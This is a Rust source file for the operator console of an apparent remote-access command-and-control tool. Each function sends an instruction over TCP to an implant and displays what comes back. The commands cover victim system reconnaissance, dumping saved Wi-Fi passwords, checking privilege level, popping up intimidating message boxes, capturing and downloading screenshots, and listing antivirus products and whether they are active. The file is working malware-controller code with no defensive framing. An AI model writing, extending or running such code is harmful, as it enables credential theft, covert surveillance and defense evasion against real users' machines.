use crate::{
    c2_state::C2State,
    commands::client::filesystem,
    constants::{CYAN, DIM, GREEN, RED, RESET, WHITE, YELLOW},
};
use shared::{
    BoxLevel, ClientMessage, Display, InstructMessage, Privilege, SystemInformation,
    utils::{get_flag_value, read_message, send_message},
};
use std::net::TcpStream;

// ---- Sysinfo ---------------------------
fn pretty_print_sysinfo(info: &SystemInformation) {
    fn opt(value: &Option<String>) -> &str {
        value.as_deref().unwrap_or("unknown")
    }

    fn fmt_bytes(bytes: u64) -> String {
        const KB: f64 = 1024.0;
        const MB: f64 = KB * 1024.0;
        const GB: f64 = MB * 1024.0;

        let bytes = bytes as f64;

        if bytes >= GB {
            format!("{:.2} GB", bytes / GB)
        } else if bytes >= MB {
            format!("{:.2} MB", bytes / MB)
        } else if bytes >= KB {
            format!("{:.2} KB", bytes / KB)
        } else {
            format!("{} B", bytes as u64)
        }
    }

    let hostname = opt(&info.os.hostname);

    println!("\n\t{DIM}[{RESET}{GREEN}sysinfo{RESET}{DIM}]{RESET} {CYAN}{hostname}{RESET}\n");

    println!("\t{DIM}[{RESET}{WHITE}os{RESET}{DIM}]{RESET}");
    println!("\t\t{YELLOW}name:{RESET}    {}", opt(&info.os.name));
    println!("\t\t{YELLOW}version:{RESET} {}", opt(&info.os.os_version));
    println!(
        "\t\t{YELLOW}kernel:{RESET}  {}",
        opt(&info.os.kernel_version)
    );

    println!("\n\t{DIM}[{RESET}{WHITE}hardware{RESET}{DIM}]{RESET}");
    println!("\t\t{YELLOW}cpu:{RESET}   {}", info.hardware.cpu_brand);
    println!("\t\t{YELLOW}cores:{RESET} {}", info.hardware.cpu_count);

    println!("\n\t{DIM}[{RESET}{WHITE}memory{RESET}{DIM}]{RESET}");
    println!(
        "\t\t{YELLOW}ram:{RESET}  {} / {}",
        fmt_bytes(info.memory.used_ram),
        fmt_bytes(info.memory.total_ram)
    );
    println!(
        "\t\t{YELLOW}swap:{RESET} {} / {}",
        fmt_bytes(info.memory.used_swap),
        fmt_bytes(info.memory.total_swap)
    );

    println!("\n\t{DIM}[{RESET}{WHITE}disks{RESET}{DIM}]{RESET}");
    println!(
        "\t\t{DIM}{:<18} {:<10} {:>12} {:>12} {:<5} {}{RESET}",
        "NAME", "FS", "USED", "TOTAL", "RO", "MOUNT"
    );

    for disk in &info.disks {
        let used_space = disk.total_space.saturating_sub(disk.available_space);
        let read_only = if disk.is_read_only { "yes" } else { "no" };
        let removable = if disk.is_removable { "removable" } else { "" };

        println!(
            "\t\t{:<18} {:<10} {:>12} {:>12} {:<5} {CYAN}{}{RESET} {DIM}{}{RESET}",
            disk.name,
            disk.file_system,
            fmt_bytes(used_space),
            fmt_bytes(disk.total_space),
            read_only,
            disk.device_path,
            removable
        );
    }

    println!("\n\t{DIM}[{RESET}{WHITE}processes:top 15{RESET}{DIM}]{RESET}");
    println!(
        "\t\t{DIM}{:<8} {:>7} {:>12}  {}{RESET}",
        "PID", "CPU%", "MEM", "NAME"
    );

    let mut processes = info.processes.iter().collect::<Vec<_>>();
    processes.sort_by(|a, b| {
        b.memory.cmp(&a.memory).then_with(|| {
            b.cpu_usage
                .partial_cmp(&a.cpu_usage)
                .unwrap_or(std::cmp::Ordering::Equal)
        })
    });

    for process in processes.into_iter().take(15) {
        println!(
            "\t\t{:<8} {:>6.1}% {:>12}  {WHITE}{}{RESET}",
            process.pid,
            process.cpu_usage,
            fmt_bytes(process.memory),
            process.name
        );
    }

    println!();
}

pub fn sysinfo(conn: &mut TcpStream) -> Result<bool, String> {
    let msg = InstructMessage::SysInfo;
    match send_message(conn, &msg) {
        Ok(_) => (),
        Err(e) => {
            println!(
                "\n\t{DIM}[{RESET}{RED}sysinfo{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n",
                e
            );
            return Ok(true);
        }
    }

    let msg: ClientMessage = read_message(conn).map_err(|e| e.to_string())?;

    match msg {
        ClientMessage::SystemInformation(info) => {
            pretty_print_sysinfo(&info);
        }
        ClientMessage::Error(e) => {
            println!("\n\t{DIM}[{RESET}{RED}err:sysinfo{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n", e);
            return Err(e)
        },
        _ => {
            println!("\n\t{DIM}[{RESET}{RED}err:sysinfo{RESET}{DIM}]{RESET} {YELLOW}Response not recognized{RESET}\n");
            return Err("unknown response mensage".to_string()); 
        }
    }

    Ok(true)
}
// ---- Sysinfo ---------------------------

// ---- WifiDump ---------------------------
pub fn wifidump(conn: &mut TcpStream) -> Result<bool, String> {
    let msg = InstructMessage::WifiDump;
    match send_message(conn, &msg) {
        Ok(_) => (),
        Err(e) => {
            println!(
                "\n\t{DIM}[{RESET}{RED}wifidump{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n",
                e
            );
            return Ok(true);
        }
    };

    let msg: ClientMessage = read_message(conn).map_err(|e| e.to_string())?;
    match msg {
        ClientMessage::WifiDump(wifi_passwords) => {
            println!();
            for wifi in &wifi_passwords {
                println!("{}", wifi);
                println!("{}", "-".repeat(40));
            }
            println!();
        }
        ClientMessage::Error(e) => {
            println!("\n\t{DIM}[{RESET}{RED}err:wifidump{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n", e);
            return Err(e)
        },
        _ => {
            println!("\n\t{DIM}[{RESET}{RED}err:wifidump{RESET}{DIM}]{RESET} {YELLOW}Response not recognized{RESET}\n");
            return Err("unknown response mensage".to_string()); 
        }
    }

    Ok(true)
}
// ---- WifiDump ---------------------------

// ---- Check ---------------------------
pub fn check_permissions(conn: &mut TcpStream) -> Result<bool, String> {
    let msg = InstructMessage::Check;
    match send_message(conn, &msg) {
        Ok(_) => (),
        Err(e) => {
            println!(
                "\n\t{DIM}[{RESET}{RED}check{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n",
                e
            );
            return Ok(true);
        }
    }

    let msg: Privilege = read_message(conn).map_err(|e| e.to_string())?;

    match msg {
        Privilege::Admin => {
            println!(
                "\n\t{DIM}[{RESET}{GREEN}check{RESET}{DIM}]{RESET} {CYAN}Admin Privileges{RESET}\n"
            );
            Ok(true)
        }
        Privilege::User => {
            println!(
                "\n\t{DIM}[{RESET}{RED}check{RESET}{DIM}]{RESET} {YELLOW}User Privileges{RESET}\n"
            );
            Ok(true)
        }
    }
}
// ---- Check ---------------------------

// ---- Display ---------------------------
pub fn display(instruct: &[&str], conn: &mut TcpStream) -> Result<bool, String> {
    let instruct = instruct.join(" ");
    let args = shell_words::split(&instruct).map_err(|e| e.to_string())?;

    let title = match get_flag_value(&args, "-t") {
        Some(f) => f,
        None => {
            println!(
                "\n\t{DIM}[{RESET}{RED}display{RESET}{DIM}]{RESET} {YELLOW}Missing title.{RESET}\n\n\t\t{DIM}Usage:{RESET} {CYAN}display -t \"A Scary title\" -c \"A Scary content\"{RESET}\n"
            );
            return Ok(true);
        }
    };
    let content = match get_flag_value(&args, "-c") {
        Some(f) => f,
        None => {
            println!(
                "\n\t{DIM}[{RESET}{RED}display{RESET}{DIM}]{RESET} {YELLOW}Missing content.{RESET}\n\n\t\t{DIM}Usage:{RESET} {CYAN}display -c \"A Scary content\" -t \"A Scary title\"{RESET}\n"
            );
            return Ok(true);
        }
    };
    let level_raw = get_flag_value(&args, "-l").unwrap_or_else(|| "info".to_string());

    let level = match level_raw.to_ascii_lowercase().as_str() {
        "info" => BoxLevel::Info,
        "warning" | "warn" => BoxLevel::Warning,
        "error" | "err" => BoxLevel::Error,
        _ => {
            println!(
                "\n\t{DIM}[{RESET}{RED}err:display{RESET}{DIM}]{RESET} {YELLOW}Invalid level:{RESET} {WHITE}{}{RESET} {DIM}(try: info / warning / error){RESET}\n",
                level_raw
            );
            return Ok(true);
        }
    };

    let msg = InstructMessage::Display(Display {
        title,
        content,
        level,
    });

    send_message(conn, &msg).map_err(|e| e.to_string())?;

    Ok(true)
}
// ---- Display ---------------------------

// ---- Screenshot ---------------------------
pub fn screenshot(conn: &mut TcpStream, state: &C2State) -> Result<bool, String> {
    match send_message(conn, &InstructMessage::Screenshot) {
        Ok(_) => (),
        Err(e) => {
            println!(
                "\n\t{DIM}[{RESET}{RED}screenshot{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n",
                e
            );
            return Ok(true);
        }
    };

    let msg: ClientMessage = read_message(conn).map_err(|e| e.to_string())?;

    match msg {
        ClientMessage::Screenshot(path) => {
            filesystem::download_file(path, true, conn, state)
        }
        ClientMessage::Error(e) => {
            println!("\n\t{DIM}[{RESET}{RED}err:screenshot{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n", e);
            return Err(e)
        },
        _ => {
            println!("\n\t{DIM}[{RESET}{RED}err:screenshot{RESET}{DIM}]{RESET} {YELLOW}Response not recognized{RESET}\n");
            return Err("unknown response mensage".to_string()); 
        }
    }
}

// ---- Screenshot ---------------------------

// ---- Av ---------------------------
pub fn av(conn: &mut TcpStream) -> Result<bool, String> {
    let msg = InstructMessage::AntiVirus;
    match send_message(conn, &msg) {
        Ok(_) => (),
        Err(e) => {
            println!(
                "\n\t{DIM}[{RESET}{RED}check{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n",
                e
            );
            return Ok(true);
        }
    }

    let msg: ClientMessage = match read_message(conn) {
        Ok(msg) => msg,
        Err(err) => return Err(err.to_string()),
    };

    match msg {
        ClientMessage::AntiVirus(avs) => {
            println!("\n\t{DIM}[{RESET}{GREEN}antivirus{RESET}{DIM}]{RESET}");

            if avs.is_empty() {
                println!("\t  No antivirus detected\n");
            } else {
                for av in avs {
                    let active = if av.active {
                        format!("{GREEN}ON{RESET}")
                    } else {
                        format!("{RED}OFF{RESET}")
                    };

                    let signatures = if av.signatures_up_to_date {
                        format!("{GREEN}up-to-date{RESET}")
                    } else {
                        format!("{YELLOW}outdated{RESET}")
                    };

                    println!(
                        "\t  • {}{}{}{}",
                        CYAN,
                        av.name,
                        RESET,
                        if av.is_default {
                            format!(" {DIM}(default){RESET}")
                        } else {
                            String::new()
                        }
                    );

                    println!("\t      State: {}", active);
                    println!("\t      Signatures: {}", signatures);
                }

                println!();
            }
        },
        ClientMessage::Error(e) => {
            println!("\n\t{DIM}[{RESET}{RED}err:av{RESET}{DIM}]{RESET} {YELLOW}{}{RESET}\n", e);
            return Err(e)
        },
        _ => {
            println!("\n\t{DIM}[{RESET}{RED}err:av{RESET}{DIM}]{RESET} {YELLOW}Response not recognized{RESET}\n");
            return Err("unknown response mensage".to_string()); 
        }
    };

    Ok(true)
}
// ---- Av ---------------------------
